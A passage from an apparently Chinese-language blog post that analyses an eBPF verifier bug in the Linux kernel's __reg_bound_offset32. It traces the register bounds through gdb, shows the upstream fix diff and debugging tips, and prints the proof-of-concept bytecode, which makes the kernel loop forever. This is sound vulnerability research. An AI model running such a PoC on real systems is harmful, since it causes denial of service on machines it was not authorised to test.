&lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x30303030</span>,</span><br><span class="line">    mask = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x30303030</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行这条语句之后，<code>r0</code>的状态变为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x30303020</span>,</span><br><span class="line">    mask = <span class="number">0x10000001f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面来解释下为什么会有这样的变化</p>
<p>在遇到跳转指令的时候，会调用<code>check_cond_jmp_op</code>来检查该指令</p>
<p>在该函数中，由于<code>r0</code>不是一个确定的数字，因此会调用<code>reg_set_min_max_inv</code>来设置寄存器的最大最小值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reg_set_min_max_inv</span><span class="params">(struct bpf_reg_state *true_reg,</span></span></span><br><span class="line"><span class="function"><span class="params">				struct bpf_reg_state *false_reg, u64 val,</span></span></span><br><span class="line"><span class="function"><span class="params">				u8 opcode, <span class="keyword">bool</span> is_jmp32)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s64 sval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__is_pointer_value(<span class="literal">false</span>, false_reg))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	val = is_jmp32 ? (u32)val : val;</span><br><span class="line">	sval = is_jmp32 ? (s64)(s32)val : (s64)val;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">	……</span><br><span class="line">	<span class="keyword">case</span> BPF_JSLE:</span><br><span class="line">	<span class="keyword">case</span> BPF_JSLT:</span><br><span class="line">	&#123;</span><br><span class="line">		s64 false_smax = opcode == BPF_JSLT ? sval    : sval - <span class="number">1</span>;</span><br><span class="line">		s64 true_smin = opcode == BPF_JSLT ? sval + <span class="number">1</span> : sval;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_jmp32 &amp;&amp; !cmp_val_with_extended_s64(sval, false_reg))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		false_reg-&gt;smax_value = min(false_reg-&gt;smax_value, false_smax);</span><br><span class="line">		true_reg-&gt;smin_value = max(true_reg-&gt;smin_value, true_smin);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__reg_deduce_bounds(false_reg);</span><br><span class="line">	__reg_deduce_bounds(true_reg);</span><br><span class="line">	<span class="comment">/* We might have learned some bits from the bounds. */</span></span><br><span class="line">	__reg_bound_offset(false_reg);</span><br><span class="line">	__reg_bound_offset(true_reg);</span><br><span class="line">	<span class="keyword">if</span> (is_jmp32) &#123;			&lt;----------------------</span><br><span class="line">		__reg_bound_offset32(false_reg);	&lt;-------------------</span><br><span class="line">		__reg_bound_offset32(true_reg);		&lt;-------------------</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Intersecting with the old var_off might have improved our bounds</span></span><br><span class="line"><span class="comment">	 * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),</span></span><br><span class="line"><span class="comment">	 * then new var_off is (0; 0x7f...fc) which improves our umax.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	__update_reg_bounds(false_reg);</span><br><span class="line">	__update_reg_bounds(true_reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>false_reg</code>和<code>true_reg</code>表示两种状态，即该<code>if</code>不成立时的<code>reg</code>和<code>if</code>成立时的<code>reg</code></p>
<p>漏洞所处代码就在箭头所指的地方，这里仅跟进<code>false_reg</code></p>
<p>先说明执行<code>__reg_bound_offset32</code>函数之前，<code>false_reg</code>的状态</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$false_reg = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x0</span>,</span><br><span class="line">    mask = <span class="number">0x1ffffffff</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> = <span class="title">tnum_range</span>(<span class="title">reg</span>-&gt;<span class="title">umin_value</span> &amp; <span class="title">mask</span>,</span></span><br><span class="line"><span class="class">				       <span class="title">reg</span>-&gt;<span class="title">umax_value</span> &amp; <span class="title">mask</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> = <span class="title">tnum_cast</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 4);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> = <span class="title">tnum_lshift</span>(<span class="title">tnum_rshift</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 32), 32);</span></span><br><span class="line"></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数执行完之后，寄存器的状态变为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x30303020</span>,</span><br><span class="line">    mask = <span class="number">0x10000001f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  smax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  umin_value = <span class="number">0x30303030</span>,</span><br><span class="line">  umax_value = <span class="number">0x13030302f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再之后，执行<code>__update_reg_bounds(false_reg)</code>之后：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">	reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">	reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">			      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>reg</code>不变，这里可以推导一下</p>
<h3 id="6-07-r0-2144337872"><a href="#6-07-r0-2144337872" class="headerlink" title="6: (07) r0 += -2144337872"></a>6: (07) r0 += -2144337872</h3><p>执行完这一句之后，寄存器状态：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0xb0603040</span>,</span><br><span class="line">    mask = <span class="number">0xffffffff0000003f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0xffffffffb0603060</span>,</span><br><span class="line">  smax_value = <span class="number">0xb060305f</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x0</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-14-w0-1607454672"><a href="#7-14-w0-1607454672" class="headerlink" title="7: (14) w0 -= -1607454672"></a>7: (14) w0 -= -1607454672</h3><p>执行这一句的时候，先会用<code>coerce_reg_to_size</code>把寄存器转换为32位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0xb0603040</span>,</span><br><span class="line">    mask = <span class="number">0x3f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x0</span>,</span><br><span class="line">  smax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x8</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再做减法并改变<code>var_off</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x10300000</span>,</span><br><span class="line">    mask = <span class="number">0x7f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0xffffffff5fcfcfd0</span>,</span><br><span class="line">  smax_value = <span class="number">0x5fcfcfcf</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x8</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再<code>coerce_reg_to_size</code>转为32位：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x10300000</span>,</span><br><span class="line">    mask = <span class="number">0x7f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x0</span>,</span><br><span class="line">  smax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  umin_value = <span class="number">0x0</span>,</span><br><span class="line">  umax_value = <span class="number">0xffffffff</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x8</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，在<code>__update_reg_bounds</code>函数中，寄存器被变为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 = &#123;</span><br><span class="line">  type = SCALAR_VALUE,</span><br><span class="line">  &#123;</span><br><span class="line">    range = <span class="number">0x0</span>,</span><br><span class="line">    map_ptr = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">    btf_id = <span class="number">0x0</span>,</span><br><span class="line">    raw = <span class="number">0x0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  off = <span class="number">0x0</span>,</span><br><span class="line">  id = <span class="number">0x0</span>,</span><br><span class="line">  ref_obj_id = <span class="number">0x0</span>,</span><br><span class="line">  var_off = &#123;</span><br><span class="line">    value = <span class="number">0x10300000</span>,</span><br><span class="line">    mask = <span class="number">0x7f</span></span><br><span class="line">  &#125;,</span><br><span class="line">  smin_value = <span class="number">0x10300000</span>,</span><br><span class="line">  smax_value = <span class="number">0x1030007f</span>,</span><br><span class="line">  umin_value = <span class="number">0x10300000</span>,</span><br><span class="line">  umax_value = <span class="number">0x1030007f</span>,</span><br><span class="line">  parent = <span class="number">0x0</span> &lt;fixed_percpu_data&gt;,</span><br><span class="line">  frameno = <span class="number">0x0</span>,</span><br><span class="line">  subreg_def = <span class="number">0x8</span>,</span><br><span class="line">  live = REG_LIVE_WRITTEN,</span><br><span class="line">  precise = <span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-76-if-w0-s-gt-0x303030-goto-pc-2"><a href="#9-76-if-w0-s-gt-0x303030-goto-pc-2" class="headerlink" title="9: (76) if w0 s&gt;= 0x303030 goto pc+2"></a>9: (76) if w0 s&gt;= 0x303030 goto pc+2</h3><p>相关代码为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_JSGE:</span><br><span class="line">		<span class="keyword">if</span> (reg-&gt;smin_value &gt;= sval)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (reg-&gt;smax_value &lt; sval)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>这里<code>reg-&gt;smin_value</code>为<code>0x10300000</code>，<code>sval</code>为<code>0x303030</code>，可以看到这里会返回1，表示该if语句恒成立</p>
<p>那么从此刻开始，下一个被检测的语句就变成了第12句，而第10和第11句就被patch成了<code>goto pc-1</code></p>
<p>然而，在实际的计算过程中，此刻的<code>w0</code>为<code>0xCFD0</code>，小于<code>0x303030</code>，就会导致真正在执行的过程中，内核会执行<code>goto pc-1</code>，导致空转，死循环</p>
<h2 id="深入思考"><a href="#深入思考" class="headerlink" title="深入思考"></a>深入思考</h2><p>作者是如何修复该漏洞的？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">047b</span>2e8.<span class="number">.2</span>a84f73 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-1036</span>,<span class="number">17</span> +<span class="number">1036</span>,<span class="number">6</span> @@ <span class="keyword">static</span> <span class="keyword">void</span> __reg_bound_offset(struct bpf_reg_state *reg)</span><br><span class="line"> 						 reg-&gt;umax_value));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">static</span> <span class="keyword">void</span> __reg_bound_offset32(struct bpf_reg_state *reg)</span><br><span class="line">-&#123;</span><br><span class="line">-	u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">-	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> = <span class="title">tnum_range</span>(<span class="title">reg</span>-&gt;<span class="title">umin_value</span> &amp; <span class="title">mask</span>,</span></span><br><span class="line"><span class="class">-				       <span class="title">reg</span>-&gt;<span class="title">umax_value</span> &amp; <span class="title">mask</span>);</span></span><br><span class="line">-	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> = <span class="title">tnum_cast</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 4);</span></span><br><span class="line">-	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> = <span class="title">tnum_lshift</span>(<span class="title">tnum_rshift</span>(<span class="title">reg</span>-&gt;<span class="title">var_off</span>, 32), 32);</span></span><br><span class="line">-</span><br><span class="line">-	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">-&#125;</span><br><span class="line">-</span><br><span class="line"> <span class="comment">/* Reset the min/max bounds of a register */</span></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_unbounded(struct bpf_reg_state *reg)</span><br><span class="line"> &#123;</span><br><span class="line">@@ <span class="number">-5805</span>,<span class="number">10</span> +<span class="number">5794</span>,<span class="number">6</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reg_set_min_max</span><span class="params">(struct bpf_reg_state *true_reg,</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="comment">/* We might have learned some bits from the bounds. */</span></span></span></span><br><span class="line"><span class="function"><span class="params"> 	__reg_bound_offset(false_reg);</span></span></span><br><span class="line"><span class="function"><span class="params"> 	__reg_bound_offset(true_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-	<span class="keyword">if</span> (is_jmp32) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-		__reg_bound_offset32(false_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-		__reg_bound_offset32(true_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-	&#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="comment">/* Intersecting with the old var_off might have improved our bounds</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment"> 	 * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment"> 	 * then new var_off is (0; 0x7f...fc) which improves our umax.</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">@@ -5918,10 +5903,6 @@ static void reg_set_min_max_inv(struct bpf_reg_state *true_reg,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment"> 	/* We might have learned some bits from the bounds. */</span></span></span></span><br><span class="line"><span class="function"><span class="params"> 	__reg_bound_offset(false_reg);</span></span></span><br><span class="line"><span class="function"><span class="params"> 	__reg_bound_offset(true_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-	<span class="keyword">if</span> (is_jmp32) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">-		__reg_bound_offset32(false_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-		__reg_bound_offset32(true_reg);</span></span></span><br><span class="line"><span class="function"><span class="params">-	&#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> 	<span class="comment">/* Intersecting with the old var_off might have improved our bounds</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment"> 	 * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment"> 	 * then new var_off is (0; 0x7f...fc) which improves our umax.</span></span></span></span><br></pre></td></tr></table></figure>

<p>可以看到，作者只删除了<code>__reg_bound_offset32</code>这一函数便完成了漏洞的修补</p>
<p>为什么<code>__reg_bound_offset32</code>函数会导致漏洞呢？</p>
<p>如果将该函数patch掉，发现，在执行完第五句指令之后，<code>r0-&gt;var_off = {0x0, 0x1ffffffff}</code>，而不是patch前的<code>r0-&gt;var_off = {0x30303020, 0x10000001f}</code></p>
<p>正是由于这里<code>var_off</code>的偏差，如同导火索一般，导致在之后的ALU运算中，内核在调用<code>__update_reg_bounds</code>等函数来更新边界的过程中出现了偏差，导致检验系统的出错</p>
<p>另外，由于系统增加了<code>patch dead code</code>的操作，导致想要利用漏洞构造任意读写的难度大大增加</p>
<h1 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h1><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><p>可以将内核中<code>debug info</code>打开，然后再编辑<code>.config</code>文件，开启所有带有<code>BPF</code>字样的配置</p>
<p>其中，<code>CONFIG_BPF_SYSCALL</code>必须打开，不然无法使用<code>bpf</code>系统调用</p>
<p>其他的配置中，某个配置没有打开会导致gdb调试的时候无法在相关函数下断点，而我并没有找是哪一个配置，索性就全部打开</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>主要调试的代码位于<code>kernel/bpf/verifier.c</code>中，可以根据源代码，利用<code>b kernel/bpf/verifier.c:行数</code>的方式下断点</p>
<p>另外，调试的时候Poc中最后一个跳转最好改变一下，比如从<code>JSGE</code>改为<code>JSLT</code>，使条件不成立，这样可以方便我们多次调试</p>
<h2 id="打印内核中载入的eBPF程序"><a href="#打印内核中载入的eBPF程序" class="headerlink" title="打印内核中载入的eBPF程序"></a>打印内核中载入的eBPF程序</h2><p>可以将内核源码复制到镜像中，然后在虚拟机中进入<code>tools/bpf/bpftool</code>目录下，执行<code>make</code>，编译出<code>bpftool</code></p>
<p>编译完成之后，有两条相关指令</p>
<p><code>./bpftool p s</code>会显示出内核中载入的<code>eBPF</code>程序的<code>id</code>等信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@syzkaller:~# ./bpftool p s</span><br><span class="line"><span class="number">5</span>: socket_filter  tag <span class="number">31b</span>ce63e92f471c4  gpl</span><br><span class="line">	loaded_at <span class="number">2020</span><span class="number">-04</span><span class="number">-17</span>T03:<span class="number">31</span>:<span class="number">44</span>+<span class="number">0000</span>  uid <span class="number">1000</span></span><br><span class="line">	xlated <span class="number">88B</span>  jited <span class="number">89B</span>  memlock <span class="number">4096B</span></span><br></pre></td></tr></table></figure>

<p><code>./bpftool p d x i id</code>可以打印出具体的<code>eBPF</code>程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@syzkaller:~# ./bpftool p d x i <span class="number">5</span></span><br><span class="line">   <span class="number">0</span>: (b7) r0 = <span class="number">808464432</span></span><br><span class="line">   <span class="number">1</span>: (<span class="number">7f</span>) r0 &gt;&gt;= r0</span><br><span class="line">   <span class="number">2</span>: (<span class="number">14</span>) w0 -= <span class="number">808464432</span></span><br><span class="line">   <span class="number">3</span>: (<span class="number">07</span>) r0 += <span class="number">808464432</span></span><br><span class="line">   <span class="number">4</span>: (b7) r1 = <span class="number">808464432</span></span><br><span class="line">   <span class="number">5</span>: (de) <span class="keyword">if</span> w1 s&lt;= w0 <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line">   <span class="number">6</span>: (<span class="number">07</span>) r0 += <span class="number">-2144337872</span></span><br><span class="line">   <span class="number">7</span>: (<span class="number">14</span>) w0 -= <span class="number">-1607454672</span></span><br><span class="line">   <span class="number">8</span>: (<span class="number">76</span>) <span class="keyword">if</span> w0 s&gt;= <span class="number">0x303030</span> <span class="keyword">goto</span> pc+<span class="number">1</span></span><br><span class="line">   <span class="number">9</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc<span class="number">-1</span></span><br><span class="line">  <span class="number">10</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>[1] <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f2d67fec0b43edce8c416101cdc52e71145b5fef" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f2d67fec0b43edce8c416101cdc52e71145b5fef</a></p>
